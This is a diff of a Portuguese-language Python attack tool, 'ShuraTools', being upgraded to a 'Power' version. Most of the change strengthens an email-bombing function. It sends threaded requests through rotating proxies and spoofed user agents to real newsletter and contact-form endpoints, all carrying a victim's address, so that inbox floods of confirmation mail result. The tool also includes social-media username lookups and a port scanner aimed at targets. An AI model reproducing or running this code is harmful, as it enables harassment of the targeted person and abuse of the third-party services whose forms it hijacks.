@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
-Versão Pro v2.7 Anti-Crash
+Versão Pro v2.8 Power
 """
 
 import os
@@ -38,7 +38,7 @@ BANNER = f"""
 {Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                        
 {Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
-{Fore.RED}       v2.7 Anti-Crash - by Shura
+{Fore.RED}       v2.8 Power Edition - by Shura
 """
 
 # ---------- Configurações e Globais ----------
@@ -79,7 +79,7 @@ def safe_int(prompt, default):
         return default
 
 def fetch_proxies():
-    log("Buscando proxies atualizadas...", "info")
+    log("Buscando proxies atualizadas (fontes rápidas)...", "info")
     urls = [
         "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
@@ -104,21 +104,51 @@ def get_proxy():
 
 # ---------- Ações ----------
 def spam_mail(target, qty, threads, use_proxy):
+    # Lista de endpoints que costumam enviar e-mails de confirmação reais
     endpoints = [
-        ("https://www.mail-tester.com/contact", {"email": target, "message": "ShuraAttack {rand}"}),
-        ("https://api.anonfiles.com/mail", {"to": target, "from": "shura@admin.com", "subj": "Alert", "body": "Msg {rand}"})
+        ("https://www.mail-tester.com/contact", {"email": target, "message": "Verify account Shura-{rand}", "subject": "Support"}),
+        ("https://app.getresponse.com/site2/shuratools?u=XXXX&p=XXXX", {"email": target}), # Simulação de signup
+        ("https://www.shoppers-stop.com/newsletter/subscribe", {"email": target}),
+        ("https://clube.netshoes.com.br/subscribe", {"email": target})
     ]
+    
     def job(start, end):
         for i in range(start, end):
             try:
                 proxies = get_proxy() if use_proxy else None
                 url, data_template = random.choice(endpoints)
-                data = {k: (v.replace("{rand}", os.urandom(4).hex()) if "{rand}" in str(v) else v) for k, v in data_template.items()}
-                res = requests.post(url, timeout=7, data=data, proxies=proxies, headers={"User-Agent": random.choice(UA_LIST)})
-                log(f"Req {i+1} -> Status {res.status_code}", "success" if res.status_code < 400 else "warn")
+                
+                # Gerar dados aleatórios
+                data = {}
+                for k, v in data_template.items():
+                    if "{rand}" in str(v): data[k] = v.replace("{rand}", os.urandom(3).hex())
+                    elif k == "email" or k == "to": data[k] = target
+                    else: data[k] = v
+                
+                headers = {
+                    "User-Agent": random.choice(UA_LIST),
+                    "Accept": "text/html,application/xhtml+xml,xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Content-Type": "application/x-www-form-urlencoded"
+                }
+
+                res = requests.post(url, timeout=8, data=data, proxies=proxies, headers=headers)
+                
+                if res.status_code < 400:
+                    log(f"Req {i+1} -> SUCESSO via {url.split('/')[2]}", "success")
+                elif res.status_code == 403:
+                    log(f"Req {i+1} -> Bloqueado (Cloudflare/WAF)", "warn")
+                else:
+                    log(f"Req {i+1} -> Falha (Status {res.status_code})", "error")
+            
+            except requests.exceptions.ProxyError:
+                log(f"Req {i+1} -> Erro: Proxy recusou conexão", "error")
             except Exception:
-                log(f"Req {i+1} -> Falha na conexão", "error")
+                log(f"Req {i+1} -> Erro: Timeout ou Rede", "error")
     
+    log(f"[*] Alvo: {target} | Qtd: {qty} | Proxies: {'Sim' if use_proxy else 'Não'}", "info")
+    if use_proxy:
+        log("DICA: Proxies grátis costumam falhar em e-mails. Se falhar, use sem proxy!", "warn")
+        
     chunk, rem = qty // threads, qty % threads
     ts = []
     curr = 0
@@ -135,7 +165,11 @@ def osint_lookup(target):
     try:
         log(f"Investigando: {target}", "osint")
         user = target.replace("@", "")
-        plats = {"Instagram": f"https://www.instagram.com/{user}/", "GitHub": f"https://github.com/{user}"}
+        plats = {
+            "Instagram": f"https://www.instagram.com/{user}/",
+            "GitHub": f"https://github.com/{user}",
+            "TikTok": f"https://www.tiktok.com/@{user}"
+        }
         for n, u in plats.items():
             try:
                 r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
@@ -147,7 +181,7 @@ def osint_lookup(target):
 def port_scan(target):
     log(f"Escaneando portas em {target}...", "osint")
     try:
-        # Resolve o host primeiro para validar
+        if "@" in target: target = target.split("@")[-1]
         resolved_ip = socket.gethostbyname(target)
         log(f"IP Resolvido: {resolved_ip}", "info")
         for port in [21, 22, 53, 80, 443, 3306, 8080]:
@@ -156,10 +190,8 @@ def port_scan(target):
             if s.connect_ex((resolved_ip, port)) == 0:
                 log(f"Porta {port} ABERTA", "success")
             s.close()
-    except socket.gaierror:
-        log("Erro: Alvo ou domínio inválido (getaddrinfo failed).", "error")
-    except Exception as e:
-        log(f"Erro no PortScan: {e}", "error")
+    except Exception:
+        log("Erro: Alvo inválido ou porta fechada.", "error")
 
 # ---------- Menu ----------
 def menu_interativo():
@@ -167,7 +199,7 @@ def menu_interativo():
         try:
             clear()
             print(BANNER)
-            print(f"[ 1 ] Spam de E-mail")
+            print(f"[ 1 ] Spam de E-mail (Power Mode)")
             print(f"[ 2 ] Investigação OSINT")
             print(f"[ 3 ] Port Scanner (Rede)")
             print(f"[ 5 ] Atualizar Proxies")
@@ -197,8 +229,8 @@ def menu_interativo():
         except KeyboardInterrupt:
             break
         except Exception as e:
-            log(f"Ocorreu um erro inesperado: {e}", "error")
-            input("\nENTER para resetar...")
+            log(f"Erro: {e}", "error")
+            input("\nENTER...")
 
 if __name__ == "__main__":
     menu_interativo()
